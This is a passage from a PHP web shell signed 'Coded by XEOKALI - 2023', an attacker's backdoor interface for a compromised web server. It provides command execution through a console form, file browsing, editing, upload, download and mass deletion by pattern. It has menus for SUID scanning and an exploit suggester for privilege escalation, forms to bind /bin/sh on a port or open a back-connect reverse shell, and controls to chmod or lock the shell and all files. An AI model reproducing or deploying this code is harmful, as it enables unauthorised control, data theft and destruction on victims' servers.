                    <input type="text" name="pattern" placeholder="File pattern (e.g., *.txt)">
                    <input type="submit" value="Delete All">
                </form>
                <?php
                if (isset($_POST['pattern'])) {
                    $files = glob($dir . '/' . $_POST['pattern']);
                    if (!empty($files)) {
                        foreach ($files as $file) {
                            deleteRecursive($file);
                        }
                        $action_message = "Deleted all matching files successfully!";
                        echo "<div class='error-message' style='background: #0f0; color: #000;'>Deleted all matching files!</div>";
                    } else {
                        $action_message = "No files found matching the pattern " . htmlspecialchars($_POST['pattern']) . ".";
                        echo "<div class='error-message'>No files found matching the pattern.</div>";
                    }
                }
                ?>
            </div>
        <?php } elseif (isset($_GET['scan_root'])) { ?>
            <div>
                <div class="actions">
                    <a href="?auto_scan">Auto Scan</a>
                    <a href="?scan_suid">Scan SUID</a>
                    <a href="?exploit_suggester">Exploit Suggester</a>
                </div>
            </div>
        <?php } elseif (isset($_GET['network'])) { ?>
            <div>
                <form method="POST">
                    <p>Bind port to /bin/sh [Perl]</p>
                    <label>Port:</label>
                    <input type="text" name="port" value="6969" required>
                    <input type="submit" name="bind_port" value="submit">
                </form>
                <form method="POST">
                    <p>Back-Connect</p>
                    <label>Server:</label>
                    <input type="text" name="server" value="<?php echo htmlspecialchars($_SERVER['REMOTE_ADDR']); ?>" required>
                    <label>Port:</label>
                    <input type="text" name="port" value="6969" required>
                    <input type="submit" name="back_connect" value="submit">
                </form>
            </div>
        <?php } elseif (isset($_GET['auto_scan']) && isset($auto_scan_output)) { ?>
            <div>
                <pre><?php echo htmlspecialchars($auto_scan_output); ?></pre>
            </div>
        <?php } elseif (isset($_GET['scan_suid']) && isset($suid_output)) { ?>
            <div>
                <pre><?php echo htmlspecialchars($suid_output); ?></pre>
            </div>
        <?php } elseif (isset($_GET['exploit_suggester']) && isset($exploit_suggestions)) { ?>
            <div>
                <pre><?php echo $exploit_suggestions; ?></pre>
            </div>
        <?php } elseif (isset($output)) { ?>
            <div>
                <pre><?php echo htmlspecialchars($output); ?></pre>
            </div>
        <?php } elseif (isset($search_output)) { ?>
            <div>
                <pre><?php echo htmlspecialchars($search_output); ?></pre>
            </div>
        <?php } ?>

        <table>
            <tr>
                <th>Name</th>
                <th>Type</th>
                <th>Last Edit</th>
                <th>Size</th>
                <th>Owner/Group</th>
                <th>Permission</th>
                <th>Action</th>
            </tr>
            <?php
            if ($dir !== '/') {
                $parent = dirname($dir);
                echo "<tr><td><a href='?dir=" . urlencode($parent) . "'>..</a></td><td>Dir</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr>";
            }
            
            $items = array_diff(scandir($dir), ['.', '..']);
            $dirs = [];
            $files = [];
            
            foreach ($items as $item) {
                $path = $dir . '/' . $item;
                if (is_dir($path)) {
                    $dirs[] = $item;
                } else {
                    $files[] = $item;
                }
            }
            
            sort($dirs);
            sort($files);
            
            foreach ($dirs as $item) {
                $path = $dir . '/' . $item;
                $stat = stat($path);
                $perms = substr(sprintf('%o', fileperms($path)), -4);
                $owner = posix_getpwuid($stat['uid'])['name'] ?? 'unknown';
                $group = posix_getgrgid($stat['gid'])['name'] ?? 'unknown';
                $last_modified = date('Y-m-d H:i:s', $stat['mtime']);
                echo "<tr>";
                echo "<td><a href='?dir=" . urlencode($path) . "'>" . htmlspecialchars($item) . "</a></td>";
                echo "<td>Dir</td>";
                echo "<td>$last_modified</td>";
                echo "<td>-</td>";
                echo "<td>$owner/$group</td>";
                echo "<td>$perms</td>";
                echo "<td class='action-icons'>";
                echo "<a href='javascript:openRenameModal(\"" . htmlspecialchars($path) . "\", \"" . htmlspecialchars($item) . "\")'>Rename</a>";
                echo "<a href='javascript:openCompressModal(\"" . htmlspecialchars($path) . "\")'>Compress</a>";
                echo "<a href='?delete=" . urlencode($path) . "' onclick='return confirm(\"Are you sure you want to delete $item?\")'>Delete</a>";
                echo "</td>";
                echo "</tr>";
            }
            
            foreach ($files as $item) {
                $path = $dir . '/' . $item;
                $stat = stat($path);
                $perms = substr(sprintf('%o', fileperms($path)), -4);
                $owner = posix_getpwuid($stat['uid'])['name'] ?? 'unknown';
                $group = posix_getgrgid($stat['gid'])['name'] ?? 'unknown';
                $last_modified = date('Y-m-d H:i:s', $stat['mtime']);
                $size = round(filesize($path) / 1024, 2) . ' KB';
                echo "<tr>";
                echo "<td>" . htmlspecialchars($item) . "</td>";
                echo "<td>File</td>";
                echo "<td>$last_modified</td>";
                echo "<td>$size</td>";
                echo "<td>$owner/$group</td>";
                echo "<td>$perms</td>";
                echo "<td class='action-icons'>";
                echo "<a href='?view_file=" . urlencode($path) . "' onclick='openViewModal(\"" . urlencode($path) . "\"); return false;'>View</a>";
                echo "<a href='?edit_file=" . urlencode($path) . "' onclick='openEditModal(\"" . urlencode($path) . "\"); return false;'>Edit</a>";
                echo "<a href='javascript:openRenameModal(\"" . htmlspecialchars($path) . "\", \"" . htmlspecialchars($item) . "\")'>Rename</a>";
                echo "<a href='?download=" . urlencode($path) . "'>Download</a>";
                echo "<a href='javascript:openCompressModal(\"" . htmlspecialchars($path) . "\")'>Compress</a>";
                if (pathinfo($path, PATHINFO_EXTENSION) === 'zip') {
                    echo "<a href='javascript:openExtractModal(\"" . htmlspecialchars($path) . "\")'>Extract</a>";
                }
                echo "<a href='?delete=" . urlencode($path) . "' onclick='return confirm(\"Are you sure you want to delete $item?\")'>Delete</a>";
                echo "</td>";
                echo "</tr>";
            }
            ?>
        </table>

        <!-- Modals -->
        <div id="upload-modal" class="modal">
            <div class="modal-content">
                <h2>Upload File</h2>
                <form method="POST" enctype="multipart/form-data">
                    <input type="file" name="upload" required>
                    <input type="submit" value="Upload">
                    <button type="button" onclick="closeModal('upload')">Close</button>
                </form>
            </div>
        </div>

        <div id="add_file-modal" class="modal">
            <div class="modal-content">
                <h2>Add File</h2>
                <form method="POST">
                    <input type="text" name="filename" placeholder="File name" required>
                    <textarea name="file_content" placeholder="File content"></textarea>
                    <input type="submit" name="add_file" value="Create">
                    <button type="button" onclick="closeModal('add_file')">Close</button>
                </form>
            </div>
        </div>

        <div id="add_folder-modal" class="modal">
            <div class="modal-content">
                <h2>Add Folder</h2>
                <form method="POST">
                    <input type="text" name="foldername" placeholder="Folder name" required>
                    <input type="submit" name="add_folder" value="Create">
                    <button type="button" onclick="closeModal('add_folder')">Close</button>
                </form>
            </div>
        </div>

        <div id="console-modal" class="modal">
            <div class="modal-content">
                <h2>Console</h2>
                <form method="POST">
                    <input type="text" name="command" placeholder="Enter command" required>
                    <input type="submit" name="console" value="Execute">
                    <button type="button" onclick="closeModal('console')">Close</button>
                </form>
            </div>
        </div>

        <div id="search-modal" class="modal">
            <div class="modal-content">
                <h2>Search Files</h2>
                <form method="POST">
                    <input type="text" name="search_term" placeholder="Search term (e.g., *.txt)" required>
                    <input type="submit" name="search" value="Search">
                    <button type="button" onclick="closeModal('search')">Close</button>
                </form>
            </div>
        </div>

        <div id="touch-modal" class="modal">
            <div class="modal-content">
                <h2>Touch File/Folder</h2>
                <form method="POST">
                    <input type="text" name="file" placeholder="Enter file or folder path" required>
                    <input type="submit" name="touch" value="Touch">
                    <button type="button" onclick="closeModal('touch')">Close</button>
                </form>
            </div>
        </div>

        <div id="view-modal" class="modal">
            <div class="modal-content">
                <h2>View File</h2>
                <pre><?php echo $file_content; ?></pre>
                <button type="button" onclick="closeModal('view')">Close</button>
            </div>
        </div>

        <div id="edit-modal" class="modal">
            <div class="modal-content">
                <h2>Edit File</h2>
                <form method="POST">
                    <input type="hidden" name="file" value="<?php echo htmlspecialchars($edit_file ?? ''); ?>">
                    <textarea name="content"><?php echo $file_content; ?></textarea>
                    <input type="submit" name="edit" value="Save">
                    <button type="button" onclick="closeModal('edit')">Close</button>
                </form>
            </div>
        </div>

        <div id="rename-modal" class="modal">
            <div class="modal-content">
                <h2>Rename</h2>
                <form method="POST">
                    <input type="hidden" name="oldname" id="rename-oldname">
                    <input type="text" name="newname" id="rename-newname" required>
                    <input type="submit" name="rename" value="Rename">
                    <button type="button" onclick="closeModal('rename')">Close</button>
                </form>
            </div>
        </div>

        <div id="compress-modal" class="modal">
            <div class="modal-content">
                <h2>Compress to ZIP</h2>
                <form method="POST">
                    <input type="hidden" name="file" id="compress-file">
                    <p>Compress <span id="compress-filename"></span> to ZIP?</p>
                    <input type="submit" name="compress" value="Compress">
                    <button type="button" onclick="closeModal('compress')">Close</button>
                </form>
            </div>
        </div>

        <div id="extract-modal" class="modal">
            <div class="modal-content">
                <h2>Extract ZIP</h2>
                <form method="POST">
                    <input type="hidden" name="file" id="extract-file">
                    <p>Extract <span id="extract-filename"></span> to current directory?</p>
                    <input type="submit" name="extract" value="Extract">
                    <button type="button" onclick="closeModal('extract')">Close</button>
                </form>
            </div>
        </div>

    </div>
    <div class="footer">
        Coded by XEOKALI - 2023
    </div>

    <script>
        <?php if (!empty($action_message)) { ?>
            alert("<?php echo addslashes($action_message); ?>");
        <?php } ?>

        function openModal(modalId) {
            document.getElementById(modalId + '-modal').style.display = 'flex';
        }

        function closeModal(modalId) {
            document.getElementById(modalId + '-modal').style.display = 'none';
        }

        function openViewModal(file) {
            window.location.href = '?view_file=' + file;
            document.getElementById('view-modal').style.display = 'flex';
        }

        function openEditModal(file) {
            window.location.href = '?edit_file=' + file;
            document.getElementById('edit-modal').style.display = 'flex';
        }

        function openRenameModal(path, name) {
            document.getElementById('rename-oldname').value = path;
            document.getElementById('rename-newname').value = name;
            document.getElementById('rename-modal').style.display = 'flex';
        }

        function openCompressModal(path) {
            document.getElementById('compress-file').value = path;
            document.getElementById('compress-filename').textContent = path.split('/').pop();
            document.getElementById('compress-modal').style.display = 'flex';
        }

        function openExtractModal(path) {
            document.getElementById('extract-file').value = path;
            document.getElementById('extract-filename').textContent = path.split('/').pop();
            document.getElementById('extract-modal').style.display = 'flex';
        }

        function lockShell() {
            if (confirm('Are you sure you want to lock the shell (chmod 0444)?')) {
                window.location.href = '?chmod_shell=0444';
            }
        }

        function chmodShell(perms) {
            if (confirm('Are you sure you want to chmod the shell to ' + perms + '?')) {
                window.location.href = '?chmod_shell=' + perms;
            }
        }

        function chmodAll(perms) {
            if (confirm('Are you sure you want to chmod all to ' + perms + '?')) {
                window.location.href = '?chmod_all=' + perms;
            }
        }

        function lockAll(perms) {
            if (confirm('Are you sure you want to lock all to ' + perms + '?')) {
                window.location.href = '?chmod_all=' + perms;
            }
        }

        <?php
        if (isset($_GET['chmod_shell'])) {
            $perms = $_GET['chmod_shell'];
            if (chmod($_SERVER['SCRIPT_FILENAME'], octdec($perms))) {
                echo "alert('Shell permissions changed to $perms successfully!');";
            } else {
                echo "alert('Failed to change shell permissions to $perms. Check permissions.');";
            }
        }

        if (isset($_GET['chmod_all'])) {
            $perms = $_GET['chmod_all'];
            $items = array_diff(scandir($dir), ['.', '..']);
            $success = true;
            foreach ($items as $item) {
                $path = $dir . '/' . $item;
                if (!chmod($path, octdec($perms))) {
                    $success = false;
                }
            }
            if ($success) {
                echo "alert('All items permissions changed to $perms successfully!');";
            } else {
                echo "alert('Failed to change permissions for some items to $perms. Check permissions.');";
            }
        }
        ?>

        <?php if (isset($_GET['view_file'])) { ?>
            document.getElementById('view-modal').style.display = 'flex';
        <?php } ?>

        <?php if (isset($_GET['edit_file'])) { ?>
            document.getElementById('edit-modal').style.display = 'flex';
        <?php } ?>
    </script>
</body>
</html>
